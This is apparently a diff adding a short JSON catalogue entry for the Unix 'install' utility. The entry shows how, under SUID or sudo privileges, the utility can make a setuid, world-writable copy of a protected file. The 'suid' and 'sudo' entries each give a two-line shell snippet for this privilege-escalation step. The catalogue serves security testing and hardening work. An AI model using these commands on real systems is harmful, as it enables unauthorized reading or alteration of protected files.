@@ -1,0 +1,15 @@
+{
+  "description": "This can be run with elevated privileges to change permissions ('6' denotes the SUID bits) and then read, write, or execute a copy of the file.",
+  "functions": {
+    "suid": [
+      {
+        "code": "TF=$(mktemp)\n./install -m 6777 [file] $TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\nsudo install -m 6777 [file] $TF\n"
+      }
+    ]
+  }
+}
